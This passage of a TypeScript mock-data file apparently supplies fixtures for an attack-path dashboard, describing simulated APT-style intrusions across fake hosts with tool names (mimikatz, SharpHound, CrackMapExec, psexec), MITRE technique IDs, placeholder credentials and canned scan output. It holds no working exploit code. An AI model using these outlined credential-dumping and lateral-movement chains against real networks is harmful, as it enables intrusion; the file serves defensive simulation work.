    // ── additional discovery edges ────────────────────────────────────────────
    { edge_id: 's4-disc02', edge_source: 's4-ep01', edge_target: 's4-ep18', edge_type: 'discovery', edge_label: 'nmap discovered, not attacked' },
    { edge_id: 's4-disc03', edge_source: 's4-ep01', edge_target: 's4-ep19', edge_type: 'discovery', edge_label: 'nmap discovered, not attacked' },
    { edge_id: 's4-disc04', edge_source: 's4-ep12', edge_target: 's4-ep20', edge_type: 'discovery', edge_label: 'discovered from app server, not attacked' },
  ],

  attack_path_stats: {
    stats_prevented: 4,
    stats_detected: 4,
    stats_undetected: 14,
    stats_pending: 0,
    stats_total_actions: 21,
    stats_executed_actions: 19,
    stats_captured_endpoints: 8,
    stats_captured_files: 12,
    stats_captured_credentials: 9,
    stats_captured_users: 6,
    stats_captured_cves: 4,
  },

  attack_path_definitions: [
    { path_id: 'p4-1', path_name: 'PrintNightmare → Jump → DC', path_color: '#e91e63', node_ids: ['s4-ep01', 's4-ep02', 's4-ep05', 's4-ep15', 's4-ep07'], path_outcome: 'success',
      path_segment_reasons: { 's4-ep01->s4-ep02': 'PrintNightmare (CVE-2021-34527)', 's4-ep02->s4-ep05': 'Credentials Harvested', 's4-ep05->s4-ep15': 'Kerberoasting', 's4-ep15->s4-ep07': 'DCSync Attack' },
      path_segment_details: {
        's4-ep01->s4-ep02': { trigger_event: 'Print Spooler Service Active', condition: 'Windows Print Spooler service running AND CVE-2021-34527 unpatched', action: 'PrintNightmare Exploit', tactic: 'Privilege Escalation', technique: 'T1068 – Exploitation for Privilege Escalation' },
        's4-ep02->s4-ep05': { trigger_event: 'Privileged Session Found', condition: 'Domain admin logged in AND LSASS accessible', action: 'Credential Dumping (Mimikatz sekurlsa)', tactic: 'Credential Access', technique: 'T1003.001 – LSASS Memory' },
        's4-ep05->s4-ep15': { trigger_event: 'SPN Enumerated', condition: 'SPN found for DB service account AND TGS ticket obtained', action: 'Kerberoasting (offline hash crack)', tactic: 'Credential Access', technique: 'T1558.003 – Kerberoasting' },
        's4-ep15->s4-ep07': { trigger_event: 'DC Replication Available', condition: 'Domain admin credentials valid AND DS-Replication-Get-Changes right', action: 'DCSync — dump all domain hashes', tactic: 'Credential Access', technique: 'T1003.006 – DCSync' },
      },
    },
    { path_id: 'p4-2', path_name: 'IT Admin Credential Chain → DC', path_color: '#ff9800', node_ids: ['s4-ep02', 's4-ep04', 's4-ep07'], path_outcome: 'success',
      path_segment_reasons: { 's4-ep02->s4-ep04': 'Pass-the-Hash', 's4-ep04->s4-ep07': 'Admin Share (C$)' },
      path_segment_details: {
        's4-ep02->s4-ep04': { trigger_event: 'NTLM Hash Captured', condition: 'Admin NTLM hash available AND SMB accessible on target', action: 'Pass-the-Hash lateral movement', tactic: 'Lateral Movement', technique: 'T1550.002 – Pass the Hash' },
        's4-ep04->s4-ep07': { trigger_event: 'Admin Share Accessible', condition: 'ADMIN$ share reachable AND write access confirmed', action: 'Lateral move via C$ admin share', tactic: 'Lateral Movement', technique: 'T1021.002 – SMB/Windows Admin Shares' },
      },
    },
    { path_id: 'p4-3', path_name: 'Finance → App Server (Dead End)', path_color: '#9c27b0', node_ids: ['s4-ep01', 's4-ep10', 's4-ep12', 's4-ep14'], path_outcome: 'failed', path_fail_reason: 'PREVENTED by Redis firewall ACL', failed_from_node_id: 's4-ep12',
      path_segment_reasons: { 's4-ep01->s4-ep10': 'Port 22 (SSH)', 's4-ep10->s4-ep12': 'Service Account Pivot', 's4-ep12->s4-ep14': 'BLOCKED: Redis ACL' },
      path_segment_details: {
        's4-ep01->s4-ep10': { trigger_event: 'SSH Key Found', condition: 'Port 22 open AND ~/.ssh/id_rsa private key discovered', action: 'SSH key-based lateral movement', tactic: 'Lateral Movement', technique: 'T1021.004 – Remote Services: SSH' },
        's4-ep10->s4-ep12': { trigger_event: 'Service Account Credentials Exposed', condition: 'Service account credentials in config file AND target reachable', action: 'Service Account lateral pivot', tactic: 'Lateral Movement', technique: 'T1078.002 – Domain Accounts' },
        's4-ep12->s4-ep14': { trigger_event: 'Redis Port Probe', condition: 'Port 6379 probe → DENIED by firewall ACL rule', action: 'PREVENTED: Firewall blocked Redis access', tactic: 'Defense Evasion', technique: 'T1562.004 – Disable or Modify System Firewall' },
      },
    },
    { path_id: 'p4-4', path_name: 'HR Pivot (Contained)', path_color: '#607d8b', node_ids: ['s4-ep01', 's4-ep02', 's4-ep09'], path_outcome: 'failed', path_fail_reason: 'Detected & contained by SOC', failed_from_node_id: 's4-ep02',
      path_segment_reasons: { 's4-ep01->s4-ep02': 'Spearphishing (Initial Access)', 's4-ep02->s4-ep09': 'Credential Dump (LSASS)' },
      path_segment_details: {
        's4-ep01->s4-ep02': { trigger_event: 'Email Link Clicked', condition: 'Malicious macro executed via HR phishing email', action: 'Spearphishing with attachment', tactic: 'Initial Access', technique: 'T1566.001 – Spearphishing Attachment' },
        's4-ep02->s4-ep09': { trigger_event: 'EDR Alert Triggered', condition: 'LSASS memory read attempt detected by EDR → session quarantined', action: 'DETECTED: Credential Dump blocked by SOC', tactic: 'Credential Access', technique: 'T1003.001 – LSASS Memory (BLOCKED)' },
      },
    },
  ],
};

/**
 * The default scenario shown in the Attack Path page.
 *   localStorage.setItem('mock_scenario', '5')   → 5-endpoint scenario
 *   localStorage.setItem('mock_scenario', '15')  → 15-endpoint scenario (default)
 *   localStorage.setItem('mock_scenario', '50')  → 50-endpoint scenario
 */

// ══════════════════════════════════════════════════════════════
// APT29 Scale — 3 Endpoints, 1 zone
// ══════════════════════════════════════════════════════════════
export const MOCK_SCENARIO_APT_3EP: AttackPathData = {
  attack_path_nodes: [
    { node_id:'s53EP-ep01', node_type:'ASSET', node_label:'WEB-01', node_hostname:'WEB-01',
      node_ip:'172.16.0.10', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
      node_is_entry_point:true,
      node_accessed_files:['C:\\Logs\\WEB-01-audit.log'],
      node_credentials_found:['CORP\\web01:P@ss01!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s53EP-ep02', node_type:'ASSET', node_label:'APP-02', node_hostname:'APP-02',
      node_ip:'172.16.0.11', node_platform:'Red Hat 8', node_status:'detected',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
      node_accessed_files:['C:\\Logs\\APP-02-audit.log'],
      node_credentials_found:['CORP\\app02:P@ss02!'],
    node_agents:['palo_alto'],
    },
    { node_id:'s53EP-ep03', node_type:'ASSET', node_label:'DB-03', node_hostname:'DB-03',
      node_ip:'172.16.0.12', node_platform:'Ubuntu 22.04 LTS', node_status:'prevented',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
    node_agents:['openaev'],
    },
    { node_id:'s53EP-a01', node_type:'ACTION', node_label:'nmap — Host Discovery (3 targets)',
      node_status:'undetected', node_hostname:'WEB-01', node_ip:'172.16.0.10',
      node_payload_name:'nmap-discovery', node_user_privileges:'root',
      node_executed_at:'2026-05-20 08:00:00 UTC', node_agent:'openaev',
      node_terminal_output:'Starting Nmap 3-host scan...\nHost 172.16.0.10 is up (0.003s latency).\n22/tcp open ssh\n445/tcp open microsoft-ds\n3 hosts scanned.',
    },
    { node_id:'s53EP-a02', node_type:'ACTION', node_label:'SharpHound → APP-02',
      node_status:'detected', node_hostname:'APP-02', node_ip:'172.16.0.11',
      node_payload_name:'SharpHound', node_user_privileges:'CORP\\net.monitor',
      node_executed_at:'2026-05-20 08:08:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] SharpHound → APP-02 (172.16.0.11)\n[+] Connected\n[!] ALERT — session terminated by SOC',
      node_credentials_found:['CORP\\app02:P@ss02!'],
      node_accessed_files:['C:\\Logs\\APP-02-audit.log'],
      node_expectations:[{expectation_id:'s53EP-e01',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s53EP-a03', node_type:'ACTION', node_label:'mimikatz-sekurlsa → DB-03',
      node_status:'prevented', node_hostname:'DB-03', node_ip:'172.16.0.12',
      node_payload_name:'mimikatz-sekurlsa', node_user_privileges:'CORP\\domain_admin',
      node_executed_at:'2026-05-20 08:10:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] mimikatz-sekurlsa → DB-03 (172.16.0.12)\n[-] BLOCKED by endpoint protection\n[!] Prevented at DB-03',
      node_expectations:[{expectation_id:'s53EP-e02',expectation_type:'PREVENTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    {
      node_id: 's53EP-a-nmap-bulk', node_type: 'ACTION', node_label: 'Nmap DMZ Discovery',
      node_status: 'undetected', node_ip: '172.16.0.0/24',
      node_payload_name: 'nmap – TCP SYN Scan (DMZ)',
      node_executed_at: '2026-05-20 07:58:00 UTC',
      node_agent: 'openaev',
      node_terminal_output: 'Starting Nmap 7.94 at 2026-05-20 07:58 UTC\nNmap scan report for 172.16.0.11 (APP-02)\nHOST: up\n22/tcp  open  ssh\n8080/tcp open  http\n\nNmap scan report for 172.16.0.12 (DB-03)\nHOST: up\n22/tcp  open  ssh\n5432/tcp open  postgresql\n\nNmap done: 3 IP addresses (2 hosts up) scanned in 2.1 seconds',
    },
  ],
  attack_path_edges:[
    {edge_id:'s53EP-c01',edge_source:'s53EP-a01',edge_target:'s53EP-a02',edge_type:'chain_flow', edge_label:'foothold → lateral'},
    {edge_id:'s53EP-c02',edge_source:'s53EP-a02',edge_target:'s53EP-a03',edge_type:'chain_flow'},
    {edge_id:'s53EP-al01',edge_source:'s53EP-a01',edge_target:'s53EP-ep01',edge_type:'asset_link'},
    {edge_id:'s53EP-al02',edge_source:'s53EP-a02',edge_target:'s53EP-ep02',edge_type:'asset_link'},
    {edge_id:'s53EP-al03',edge_source:'s53EP-a03',edge_target:'s53EP-ep03',edge_type:'asset_link'},
    {edge_id:'s53EP-nmap-ep02',edge_source:'s53EP-a-nmap-bulk',edge_target:'s53EP-ep02',edge_type:'asset_link'},
    {edge_id:'s53EP-nmap-ep03',edge_source:'s53EP-a-nmap-bulk',edge_target:'s53EP-ep03',edge_type:'asset_link'},
  ],
  attack_path_stats:{
    stats_prevented:1,stats_detected:1,stats_undetected:1,
    stats_pending:0,stats_total_actions:4,stats_executed_actions:4,
    stats_captured_endpoints:0,stats_captured_files:2,stats_captured_credentials:2,
stats_captured_users: 1,
stats_captured_cves: 1,
  },
  attack_path_definitions:[
    {path_id:'s53EP-p1',path_name:'Main Compromise Chain',path_color:'#e91e63',node_ids:['s53EP-ep01','s53EP-ep02','s53EP-ep03'],path_outcome:'success', path_segment_reasons:{'s53EP-ep01->s53EP-ep02':'Credentials Harvested','s53EP-ep02->s53EP-ep03':'Port 3389 (RDP)'}},
  ],
};
// ══════════════════════════════════════════════════════════════
// APT29 Scale — 8 Endpoints, 2 zones
// ══════════════════════════════════════════════════════════════
export const MOCK_SCENARIO_APT_8EP: AttackPathData = {
  attack_path_nodes: [
    { node_id:'s58EP-ep01', node_type:'ASSET', node_label:'WEB-01', node_hostname:'WEB-01',
      node_ip:'172.16.0.10', node_platform:'Windows 11', node_status:'undetected',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
      node_is_entry_point:true,
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\WEB-01-audit.log'],
      node_credentials_found:['CORP\\web01:P@ss01!'],
    node_agents:['palo_alto', 'sentinel_one', 'openaev'],
    },
    { node_id:'s58EP-ep02', node_type:'ASSET', node_label:'APP-02', node_hostname:'APP-02',
      node_ip:'172.16.0.11', node_platform:'CentOS 7', node_status:'undetected',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
      node_accessed_files:['C:\\Logs\\APP-02-audit.log'],
      node_credentials_found:['CORP\\app02:P@ss02!'],
    node_agents:['sentinel_one'],
    },
    { node_id:'s58EP-ep03', node_type:'ASSET', node_label:'DB-03', node_hostname:'DB-03',
      node_ip:'172.16.0.12', node_platform:'Ubuntu 22.04 LTS', node_status:'prevented',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
    node_agents:['openaev'],
    },
    { node_id:'s58EP-ep04', node_type:'ASSET', node_label:'FILE-04', node_hostname:'FILE-04',
      node_ip:'172.16.0.13', node_platform:'Red Hat 8', node_status:'prevented',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s58EP-ep05', node_type:'ASSET', node_label:'MAIL-05', node_hostname:'MAIL-05',
      node_ip:'10.10.1.54', node_platform:'Windows 10', node_status:'undetected',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
      node_accessed_files:['C:\\Logs\\MAIL-05-audit.log'],
      node_credentials_found:['CORP\\mail05:P@ss05!'],
    node_agents:['sentinel_one'],
    },
    { node_id:'s58EP-ep06', node_type:'ASSET', node_label:'JUMP-06', node_hostname:'JUMP-06',
      node_ip:'10.10.1.55', node_platform:'Windows 11', node_status:'detected',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
      node_accessed_files:['C:\\Logs\\JUMP-06-audit.log'],
      node_credentials_found:['CORP\\jump06:P@ss06!'],
    node_agents:['openaev'],
    },
    { node_id:'s58EP-ep07', node_type:'ASSET', node_label:'PRINT-07', node_hostname:'PRINT-07',
      node_ip:'10.10.1.56', node_platform:'Red Hat 8', node_status:'prevented',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
    node_agents:['palo_alto'],
    },
    { node_id:'s58EP-ep08', node_type:'ASSET', node_label:'DNS-08', node_hostname:'DNS-08',
      node_ip:'10.10.1.57', node_platform:'Windows 11', node_status:'undetected',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
      node_accessed_files:['C:\\Logs\\DNS-08-audit.log'],
      node_credentials_found:['CORP\\dns08:P@ss08!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s58EP-a01', node_type:'ACTION', node_label:'nmap — Host Discovery (8 targets)',
      node_status:'undetected', node_hostname:'WEB-01', node_ip:'172.16.0.10',
      node_payload_name:'nmap-discovery', node_user_privileges:'root',
      node_executed_at:'2026-05-20 08:00:00 UTC', node_agent:'openaev',
      node_terminal_output:'Starting Nmap 8-host scan...\nHost 172.16.0.10 is up (0.003s latency).\n22/tcp open ssh\n445/tcp open microsoft-ds\n8 hosts scanned.',
    },
    { node_id:'s58EP-a02', node_type:'ACTION', node_label:'netexec-smb-spray → APP-02',
      node_status:'undetected', node_hostname:'APP-02', node_ip:'172.16.0.11',
      node_payload_name:'netexec-smb-spray', node_user_privileges:'CORP\\domain_admin',
      node_executed_at:'2026-05-20 08:07:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] netexec-smb-spray → APP-02 (172.16.0.11)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\app02:P@ss02!'],
      node_accessed_files:['C:\\Logs\\APP-02-audit.log'],
    },
    { node_id:'s58EP-a03', node_type:'ACTION', node_label:'nmap-discovery → DB-03',
      node_status:'prevented', node_hostname:'DB-03', node_ip:'172.16.0.12',
      node_payload_name:'nmap-discovery', node_user_privileges:'CORP\\net.monitor',
      node_executed_at:'2026-05-20 08:12:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] nmap-discovery → DB-03 (172.16.0.12)\n[-] BLOCKED by endpoint protection\n[!] Prevented at DB-03',
      node_expectations:[{expectation_id:'s58EP-e02',expectation_type:'PREVENTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s58EP-a04', node_type:'ACTION', node_label:'nmap-discovery → FILE-04',
      node_status:'prevented', node_hostname:'FILE-04', node_ip:'172.16.0.13',
      node_payload_name:'nmap-discovery', node_user_privileges:'NT AUTHORITY\\SYSTEM',
      node_executed_at:'2026-05-20 08:15:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] nmap-discovery → FILE-04 (172.16.0.13)\n[-] BLOCKED by endpoint protection\n[!] Prevented at FILE-04',
      node_expectations:[{expectation_id:'s58EP-e03',expectation_type:'PREVENTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s58EP-a05', node_type:'ACTION', node_label:'netexec-smb-spray → MAIL-05',
      node_status:'undetected', node_hostname:'MAIL-05', node_ip:'10.10.1.54',
      node_payload_name:'netexec-smb-spray', node_user_privileges:'CORP\\domain_admin',
      node_executed_at:'2026-05-20 08:22:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] netexec-smb-spray → MAIL-05 (10.10.1.54)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\mail05:P@ss05!'],
      node_accessed_files:['C:\\Logs\\MAIL-05-audit.log'],
    },
    { node_id:'s58EP-a06', node_type:'ACTION', node_label:'PowerView-recon → JUMP-06',
      node_status:'detected', node_hostname:'JUMP-06', node_ip:'10.10.1.55',
      node_payload_name:'PowerView-recon', node_user_privileges:'CORP\\dev.user',
      node_executed_at:'2026-05-20 08:28:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] PowerView-recon → JUMP-06 (10.10.1.55)\n[+] Connected\n[!] ALERT — session terminated by SOC',
      node_credentials_found:['CORP\\jump06:P@ss06!'],
      node_accessed_files:['C:\\Logs\\JUMP-06-audit.log'],
      node_expectations:[{expectation_id:'s58EP-e05',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s58EP-a07', node_type:'ACTION', node_label:'CrackMapExec → PRINT-07',
      node_status:'prevented', node_hostname:'PRINT-07', node_ip:'10.10.1.56',
      node_payload_name:'CrackMapExec', node_user_privileges:'CORP\\it.admin',
      node_executed_at:'2026-05-20 08:31:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] CrackMapExec → PRINT-07 (10.10.1.56)\n[-] BLOCKED by endpoint protection\n[!] Prevented at PRINT-07',
      node_expectations:[{expectation_id:'s58EP-e06',expectation_type:'PREVENTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s58EP-a08', node_type:'ACTION', node_label:'psexec-lateral → DNS-08',
      node_status:'undetected', node_hostname:'DNS-08', node_ip:'10.10.1.57',
      node_payload_name:'psexec-lateral', node_user_privileges:'CORP\\net.monitor',
      node_executed_at:'2026-05-20 08:37:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] psexec-lateral → DNS-08 (10.10.1.57)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\dns08:P@ss08!'],
      node_accessed_files:['C:\\Logs\\DNS-08-audit.log'],
    },
    {
      node_id: 's58EP-a-nmap-bulk', node_type: 'ACTION', node_label: 'Nmap Full-Network Discovery',
      node_status: 'undetected', node_ip: '172.16.0.0/24',
      node_payload_name: 'nmap – TCP SYN Scan (full range)',
      node_executed_at: '2026-05-20 07:58:00 UTC',
      node_agent: 'openaev',
      node_terminal_output: 'Starting Nmap 7.94 at 2026-05-20 07:58 UTC\nNmap scan report for 172.16.0.11 (APP-02)\nHOST: up\n22/tcp  open  ssh\n445/tcp open  microsoft-ds\n\nNmap scan report for 172.16.0.12 (DB-03)\nHOST: up\n22/tcp  open  ssh\n5432/tcp open  postgresql\n\nNmap scan report for 172.16.0.13 (FILE-04)\nHOST: up\n22/tcp  open  ssh\n2049/tcp open  nfs\n\nNmap scan report for 10.10.1.54 (MAIL-05)\nHOST: up\n25/tcp  open  smtp\n445/tcp open  microsoft-ds\n\nNmap scan report for 10.10.1.55 (JUMP-06)\nHOST: up\n135/tcp open  msrpc\n445/tcp open  microsoft-ds\n3389/tcp open  ms-wbt-server\n\nNmap scan report for 10.10.1.56 (PRINT-07)\nHOST: up\n135/tcp open  msrpc\n9100/tcp open  jetdirect\n\nNmap scan report for 10.10.1.57 (DNS-08)\nHOST: up\n53/tcp  open  domain\n445/tcp open  microsoft-ds\n\nNmap done: 8 IP addresses (7 hosts up) scanned in 4.8 seconds',
    },
  ],
  attack_path_edges:[
    {edge_id:'s58EP-c01',edge_source:'s58EP-a01',edge_target:'s58EP-a02',edge_type:'chain_flow', edge_label:'foothold → lateral'},
    {edge_id:'s58EP-c02',edge_source:'s58EP-a02',edge_target:'s58EP-a03',edge_type:'chain_flow'},
    {edge_id:'s58EP-c03',edge_source:'s58EP-a03',edge_target:'s58EP-a04',edge_type:'chain_flow'},
    {edge_id:'s58EP-c04',edge_source:'s58EP-a04',edge_target:'s58EP-a05',edge_type:'chain_flow'},
    {edge_id:'s58EP-c05',edge_source:'s58EP-a05',edge_target:'s58EP-a06',edge_type:'chain_flow'},
    {edge_id:'s58EP-c06',edge_source:'s58EP-a06',edge_target:'s58EP-a07',edge_type:'chain_flow'},
    {edge_id:'s58EP-c07',edge_source:'s58EP-a07',edge_target:'s58EP-a08',edge_type:'chain_flow'},
    {edge_id:'s58EP-al01',edge_source:'s58EP-a01',edge_target:'s58EP-ep01',edge_type:'asset_link'},
    {edge_id:'s58EP-al02',edge_source:'s58EP-a02',edge_target:'s58EP-ep02',edge_type:'asset_link'},
    {edge_id:'s58EP-al03',edge_source:'s58EP-a03',edge_target:'s58EP-ep03',edge_type:'asset_link'},
    {edge_id:'s58EP-al04',edge_source:'s58EP-a04',edge_target:'s58EP-ep04',edge_type:'asset_link'},
    {edge_id:'s58EP-al05',edge_source:'s58EP-a05',edge_target:'s58EP-ep05',edge_type:'asset_link'},
    {edge_id:'s58EP-al06',edge_source:'s58EP-a06',edge_target:'s58EP-ep06',edge_type:'asset_link'},
    {edge_id:'s58EP-al07',edge_source:'s58EP-a07',edge_target:'s58EP-ep07',edge_type:'asset_link'},
    {edge_id:'s58EP-al08',edge_source:'s58EP-a08',edge_target:'s58EP-ep08',edge_type:'asset_link'},
    {edge_id:'s58EP-nmap-ep02',edge_source:'s58EP-a-nmap-bulk',edge_target:'s58EP-ep02',edge_type:'asset_link'},
    {edge_id:'s58EP-nmap-ep03',edge_source:'s58EP-a-nmap-bulk',edge_target:'s58EP-ep03',edge_type:'asset_link'},
    {edge_id:'s58EP-nmap-ep04',edge_source:'s58EP-a-nmap-bulk',edge_target:'s58EP-ep04',edge_type:'asset_link'},
    {edge_id:'s58EP-nmap-ep05',edge_source:'s58EP-a-nmap-bulk',edge_target:'s58EP-ep05',edge_type:'asset_link'},
    {edge_id:'s58EP-nmap-ep06',edge_source:'s58EP-a-nmap-bulk',edge_target:'s58EP-ep06',edge_type:'asset_link'},
    {edge_id:'s58EP-nmap-ep07',edge_source:'s58EP-a-nmap-bulk',edge_target:'s58EP-ep07',edge_type:'asset_link'},
    {edge_id:'s58EP-nmap-ep08',edge_source:'s58EP-a-nmap-bulk',edge_target:'s58EP-ep08',edge_type:'asset_link'},
  ],
  attack_path_stats:{
    stats_prevented:3,stats_detected:1,stats_undetected:4,
    stats_pending:0,stats_total_actions:9,stats_executed_actions:9,
    stats_captured_endpoints:2,stats_captured_files:5,stats_captured_credentials:5,
stats_captured_users: 4,
stats_captured_cves: 2,
  },
  attack_path_definitions:[
    {path_id:'s58EP-p1',path_name:'Main Compromise Chain',path_color:'#e91e63',node_ids:['s58EP-ep01','s58EP-ep02','s58EP-ep03','s58EP-ep04','s58EP-ep05','s58EP-ep06','s58EP-ep08'],path_outcome:'success', path_segment_reasons:{'s58EP-ep01->s58EP-ep02':'Spearphishing (Initial Access)','s58EP-ep02->s58EP-ep03':'Credentials Harvested','s58EP-ep03->s58EP-ep04':'Pass-the-Hash','s58EP-ep04->s58EP-ep05':'Kerberoasting','s58EP-ep05->s58EP-ep06':'Port 445 (SMB)','s58EP-ep06->s58EP-ep08':'WMI Execution'}},
    {path_id:'s58EP-p2',path_name:'Cross-Zone Lateral Path',path_color:'#ff9800',node_ids:['s58EP-ep01','s58EP-ep05','s58EP-ep06','s58EP-ep07','s58EP-ep08'],path_outcome:'success', path_segment_reasons:{'s58EP-ep01->s58EP-ep05':'Port 22 (SSH)','s58EP-ep05->s58EP-ep06':'Token Impersonation','s58EP-ep06->s58EP-ep07':'Admin Share (C$)','s58EP-ep07->s58EP-ep08':'DCOM Remote Exec'}},
    {path_id:'s58EP-p3',path_name:'Blocked Attempt',path_color:'#9c27b0',node_ids:['s58EP-ep01','s58EP-ep02','s58EP-ep03'],path_outcome:'failed', path_fail_reason:'PREVENTED by security control', failed_from_node_id:'s58EP-ep03', path_segment_reasons:{'s58EP-ep01->s58EP-ep02':'Port 3389 (RDP)','s58EP-ep02->s58EP-ep03':'Service Account Pivot'}},
  ],
};
// ══════════════════════════════════════════════════════════════
// APT29 Scale — 30 Endpoints, 3 zones
// ══════════════════════════════════════════════════════════════
export const MOCK_SCENARIO_APT_30EP: AttackPathData = {
  attack_path_nodes: [
    { node_id:'s530EP-ep01', node_type:'ASSET', node_label:'WEB-01', node_hostname:'WEB-01',
      node_ip:'172.16.0.10', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
      node_is_entry_point:true,
      node_accessed_files:['C:\\Logs\\WEB-01-audit.log'],
      node_credentials_found:['CORP\\web01:P@ss01!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s530EP-ep02', node_type:'ASSET', node_label:'APP-02', node_hostname:'APP-02',
      node_ip:'172.16.0.11', node_platform:'Windows 11', node_status:'detected',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\APP-02-audit.log'],
      node_credentials_found:['CORP\\app02:P@ss02!'],
    node_agents:['palo_alto', 'openaev'],
    },
    { node_id:'s530EP-ep03', node_type:'ASSET', node_label:'DB-03', node_hostname:'DB-03',
      node_ip:'172.16.0.12', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\DB-03-audit.log'],
      node_credentials_found:['CORP\\db03:P@ss03!'],
    node_agents:['palo_alto', 'sentinel_one'],
    },
    { node_id:'s530EP-ep04', node_type:'ASSET', node_label:'FILE-04', node_hostname:'FILE-04',
      node_ip:'172.16.0.13', node_platform:'Red Hat 8', node_status:'undetected',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
      node_is_pivot:true,
    node_agents:['palo_alto', 'openaev'],
    },
    { node_id:'s530EP-ep05', node_type:'ASSET', node_label:'MAIL-05', node_hostname:'MAIL-05',
      node_ip:'172.16.0.14', node_platform:'Ubuntu 20.04 LTS', node_status:'undetected',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\MAIL-05-audit.log'],
      node_credentials_found:['CORP\\mail05:P@ss05!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s530EP-ep06', node_type:'ASSET', node_label:'JUMP-06', node_hostname:'JUMP-06',
      node_ip:'172.16.0.15', node_platform:'Ubuntu 20.04 LTS', node_status:'detected',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
      node_accessed_files:['C:\\Logs\\JUMP-06-audit.log'],
      node_credentials_found:['CORP\\jump06:P@ss06!'],
    node_agents:['openaev'],
    },
    { node_id:'s530EP-ep07', node_type:'ASSET', node_label:'PRINT-07', node_hostname:'PRINT-07',
      node_ip:'172.16.0.16', node_platform:'Ubuntu 20.04 LTS', node_status:'undetected',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
    node_agents:['palo_alto'],
    },
    { node_id:'s530EP-ep08', node_type:'ASSET', node_label:'DNS-08', node_hostname:'DNS-08',
      node_ip:'172.16.0.17', node_platform:'Ubuntu 20.04 LTS', node_status:'undetected',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
      node_accessed_files:['C:\\Logs\\DNS-08-audit.log'],
      node_credentials_found:['CORP\\dns08:P@ss08!'],
    node_agents:['openaev'],
    },
    { node_id:'s530EP-ep09', node_type:'ASSET', node_label:'DC-09', node_hostname:'DC-09',
      node_ip:'172.16.0.18', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
      node_accessed_files:['C:\\Logs\\DC-09-audit.log'],
      node_credentials_found:['CORP\\dc09:P@ss09!'],
    node_agents:['openaev'],
    },
    { node_id:'s530EP-ep10', node_type:'ASSET', node_label:'WS-10', node_hostname:'WS-10',
      node_ip:'172.16.0.19', node_platform:'Windows Server 2019', node_status:'undetected',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
      node_accessed_files:['C:\\Logs\\WS-10-audit.log'],
      node_credentials_found:['CORP\\ws10:P@ss10!'],
    node_agents:['sentinel_one'],
    },
    { node_id:'s530EP-ep11', node_type:'ASSET', node_label:'API-11', node_hostname:'API-11',
      node_ip:'10.10.1.60', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
    node_agents:['palo_alto'],
    },
    { node_id:'s530EP-ep12', node_type:'ASSET', node_label:'BACKUP-12', node_hostname:'BACKUP-12',
      node_ip:'10.10.1.61', node_platform:'CentOS 7', node_status:'undetected',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
      node_accessed_files:['C:\\Logs\\BACKUP-12-audit.log'],
      node_credentials_found:['CORP\\backup12:P@ss12!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s530EP-ep13', node_type:'ASSET', node_label:'MONITOR-13', node_hostname:'MONITOR-13',
      node_ip:'10.10.1.62', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
